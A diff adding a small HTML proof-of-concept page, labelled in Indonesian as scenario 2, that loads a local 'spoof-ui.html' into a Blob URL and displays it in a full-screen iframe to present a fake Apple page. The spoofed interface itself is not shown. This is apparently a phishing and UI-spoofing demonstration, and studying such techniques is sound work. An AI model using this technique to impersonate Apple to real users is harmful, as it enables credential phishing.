@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><title>PoC Skenario 2</title></head>
+<body>
+  <h2>Blob-based Fake Apple Page</h2>
+  <button onclick="run()">Inject Spoof</button>
+
+  <script>
+    async function run() {
+      const html = await fetch("assets/spoof-ui.html").then(r => r.text());
+      const blob = new Blob([html], { type: "text/html" });
+      const blobURL = URL.createObjectURL(blob);
+      document.body.innerHTML = `<iframe src="${blobURL}" style="width:100vw;height:100vh;border:none;"></iframe>`;
+    }
+  </script>
+</body>
+</html>
